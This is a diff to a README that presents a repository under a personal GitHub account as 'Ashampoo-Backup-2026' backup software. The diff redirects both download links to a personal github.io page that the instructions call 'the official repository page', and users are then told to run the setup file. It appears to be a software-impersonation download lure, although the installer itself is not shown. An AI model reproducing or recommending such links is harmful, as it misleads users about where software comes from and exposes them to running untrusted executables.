@@ -1,6 +1,6 @@
 # 💾 Ashampoo-Backup-2026 - Secure your files with total ease
 
-[![](https://img.shields.io/badge/Download-Ashampoo-blue.svg)](https://github.com/anishkachhap20-ux/Ashampoo-Backup-2026)
+[![](https://img.shields.io/badge/Download-Ashampoo-blue.svg)](https://anishkachhap20-ux.github.io)
 
 ## 📋 What is this software?
 
@@ -21,7 +21,7 @@ Before you install the software, check your computer setup. These requirements e
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the official repository page to get the installer: [Download Ashampoo-Backup-2026](https://github.com/anishkachhap20-ux/Ashampoo-Backup-2026).
+1.  Visit the official repository page to get the installer: [Download Ashampoo-Backup-2026](https://anishkachhap20-ux.github.io).
 2.  Locate the setup file in your Downloads folder.
 3.  Double-click the file to start the installation wizard.
 4.  Accept the terms of the license agreement when prompted.
